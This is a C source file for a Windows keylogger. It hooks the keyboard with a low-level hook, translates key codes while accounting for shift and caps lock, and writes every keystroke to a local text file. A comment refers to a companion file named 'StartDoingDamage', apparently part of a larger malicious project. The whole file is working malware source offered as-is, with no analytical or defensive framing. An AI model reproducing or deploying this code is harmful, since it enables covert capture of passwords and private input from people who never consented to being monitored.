#include "KeyLogger.h"


struct SPECIAL_KEY special_keys[] = {
    {8, "[BS]"},
    {13, "[Enter]"},
    {32, " "},
    {46, "[Delete]"},
    {162, "[L_CTRL]"},
    {163, "[R_CTRL]"},
    {106, "*"},
    {107, "+"},
    {109, "-"},
    {110, "."},
    {111, "/"},
    {187, "="},
    {188, ","},
    {189, "-"},
    {190, "."}
};

// * saved as string and not chars due to the struct variables. *
struct SPECIAL_KEY special_top_bar[] = {
    {49, "!"},
    {50, "@"},
    {51, "#"},
    {52, "$"},
    {53, "%"},
    {54, "^"},
    {55, "&"},
    {56, "*"},
    {57, "("},
    {48, ")"},
    {189, "_"},
    {187, "+"},
};

HHOOK keyboardHook;

DWORD caps_lock = 0;
DWORD shift = 0;

// This variable is declared in KeyLogger.h due to needs to use this variable in StartDoingDamage file.
//HANDLE file_handle;


int key_logger()
{

    // creating file for the key logger
    file_handle = CreateFileA(
        "every_thing_written.txt",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (file_handle == INVALID_HANDLE_VALUE)
    {
        printf("Problem creating file for key logger! \n");
        return -1;
    }
    

    // strting the hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

    MSG msg = { 0 };
    //our application loop
    while (GetMessage(&msg, NULL, 0, 0) != 0);
    UnhookWindowsHookEx(keyboardHook);
     

    // closing the file handle in the stop key logger function!
    //CloseHandle(file_handle);

	return 0;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    DWORD i = 0, printed = 0, iReturn = 0; //int
    unsigned short shift_pressed = 0; //short
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    BYTE lp_buffer; // unsigned char

    //a key was pressed
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION) // if some button was pressed
    {
        printed = 0; // initializing the printed variable
        //printf("Key = %d \n", key->vkCode);
        
        shift_pressed = GetAsyncKeyState(VK_SHIFT); // 160 or 161 in ascii

        if (shift_pressed) //if the shift is pressed
        {
            shift = 1;
        }
        else
        {
            shift = 0;
        }

        // checking if the upper case button was pressed
        if (key->vkCode == 20)
        {
            caps_lock = !caps_lock;
            printed = 1;
        }

        // if the shift button was pressed, we don't need to print it's ascii value
        if (key->vkCode == 160 || key->vkCode == 161)
        {
            printed = 1;
        }
    
        if (!shift && !printed)
        {
            // looking for special keys
            for (i = 0; i < sizeof(special_keys) / sizeof(struct SPECIAL_KEY); i++)
            {
                if (key->vkCode == special_keys[i].ascii)
                {
                    // checking if the special key is a char (length of 1) or string (longer than 1 char) -> with the ternary operator (the strlen and the sizeof dide problem because strlen works only on string)
                     iReturn = WriteFile(
                        file_handle,
                        (strlen(special_keys[i].key_name) > 1 ? special_keys[i].key_name : (&(char)*special_keys[i].key_name)),
                        (strlen(special_keys[i].key_name) > 1 ? strlen(special_keys[i].key_name) : sizeof((char)*special_keys[i].key_name)),
                        NULL,
                        NULL
                    );

                    if (iReturn == 0)
                    {
                        printf("Problem writing to the key logger file! \n");
                        exit(-1);
                    }


                    printf("%s", special_keys[i].key_name);
                    printed = 1;
                }
            }
        }

        // if a number in top bar was pressed
        if ((((key->vkCode) >= 48 && (key->vkCode) <= 57) || ((key->vkCode) == 187) || ((key->vkCode) == 189)) && !printed)
        {
            if (!shift) // if shift is not pressed
            {
                lp_buffer = key->vkCode; // char

                iReturn = WriteFile(
                    file_handle,
                    &(lp_buffer),
                    sizeof(lp_buffer),
                    NULL,
                    NULL
                );

                if (iReturn == 0)
                {
                    printf("Problem writing to the key logger file! \n");
                    exit(-1);
                }


                printf("%c", lp_buffer);

                printed = 1;
            }

            else // if shift is pressed, need to print the special keys in the top bar
            {

                // looking for top bar special keys
                for (i = 0; i < sizeof(special_top_bar) / sizeof(struct SPECIAL_KEY); i++)
                {
                    if (key->vkCode == special_top_bar[i].ascii && !printed)
                    {
                        // size of char
                        iReturn = WriteFile(
                            file_handle,
                            &((char)*special_top_bar[i].key_name),
                            sizeof((char)*special_top_bar[i].key_name),
                            NULL,
                            NULL
                        );

                        if (iReturn == 0)
                        {
                            printf("Problem writing to the key logger file! \n");
                            exit(-1);
                        }

                        printf("%s", special_top_bar[i].key_name);
                        printed = 1;
                    }
                }

            }
        }


        // if number in num pad was pressed
        else if (((key->vkCode) >= 96 && (key->vkCode) <= 105) && !printed)
        {
            lp_buffer = key->vkCode - 48;

            iReturn = WriteFile(
                file_handle,
                &(lp_buffer),
                sizeof(lp_buffer),
                NULL,
                NULL
            );

            if (iReturn == 0)
            {
                printf("Problem writing to the key logger file! \n");
                exit(-1);
            }

            printf("%c", lp_buffer);
            printed = 1;
        }

        else if ((caps_lock || shift) && !printed) // print letter as upper case
        {
            lp_buffer = key->vkCode; // char

            iReturn = WriteFile(
                file_handle,
                &(lp_buffer),
                sizeof(lp_buffer),
                NULL,
                NULL
            );

            if (iReturn == 0)
            {
                printf("Problem writing to the key logger file! \n");
                exit(-1);
            }

            printf("%c", lp_buffer);
            printed = 1;
        }

        else if (!printed) // print letter as lower case
        {
            lp_buffer = key->vkCode + 32;

            iReturn = WriteFile(
                file_handle,
                &(lp_buffer),
                sizeof(lp_buffer),
                NULL,
                NULL
            );

            if (iReturn == 0)
            {
                printf("Problem writing to the key logger file! \n");
                exit(-1);
            }

            printf("%c", lp_buffer);
            printed = 1;
        }
    
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}